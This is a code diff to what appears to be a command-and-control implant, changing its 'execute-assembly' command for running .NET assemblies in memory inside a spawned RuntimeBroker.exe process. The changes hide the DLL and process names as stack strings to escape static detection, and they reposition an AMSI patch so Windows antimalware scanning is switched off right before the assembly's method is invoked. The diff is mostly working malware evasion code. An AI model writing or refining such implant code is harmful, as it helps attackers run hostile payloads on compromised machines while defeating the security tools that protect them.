@@ -5,6 +5,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <stackstr.h>
 
 #ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY
 
@@ -135,8 +136,8 @@ auto declfn starburst::cmd_execute_assembly(
 
     // build command line for host process
     wchar_t cmdline[512] = { 0 };
-    auto cmd_str = symbol<const char*>( "C:\\Windows\\System32\\RuntimeBroker.exe" );
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, cmd_str, -1, cmdline, 512 );
+    STK_RUNTIMEBROKER(_n1);
+    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, _n1, -1, cmdline, 512 );
 
     STARTUPINFOW si = {};
     si.cb = sizeof( STARTUPINFOW );
@@ -180,12 +181,9 @@ auto declfn starburst::cmd_execute_assembly(
     inst.kernel32.CloseHandle( pi.hThread );
     inst.kernel32.CloseHandle( h_read );
 
-#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
-    evasion_patch_amsi( inst );
-#endif
-
     // local CLR hosting approach
-    auto h_mscoree = inst.kernel32.LoadLibraryA( symbol<const char*>( "mscoree.dll" ) );
+    STK_MSCOREE(_n2);
+    auto h_mscoree = inst.kernel32.LoadLibraryA( _n2 );
     if ( !h_mscoree ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "mscoree.dll load failed" ) ) );
@@ -297,7 +295,8 @@ auto declfn starburst::cmd_execute_assembly(
     }
 
     // Load oleaut32 for SAFEARRAY + BSTR
-    auto h_oleaut32 = inst.kernel32.LoadLibraryA( symbol<const char*>( "oleaut32.dll" ) );
+    STK_OLEAUT32(_n3);
+    auto h_oleaut32 = inst.kernel32.LoadLibraryA( _n3 );
     if ( !h_oleaut32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "oleaut32 load failed" ) ) );
@@ -463,6 +462,10 @@ auto declfn starburst::cmd_execute_assembly(
 
     VARIANT v_result;
     memory::zero( &v_result, sizeof( VARIANT ) );
+
+    #if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
+        evasion_patch_amsi( inst );
+    #endif
 
     // _MethodInfo::Invoke_3 at vtable[37]
     typedef HRESULT ( __stdcall *fn_Invoke3 )(
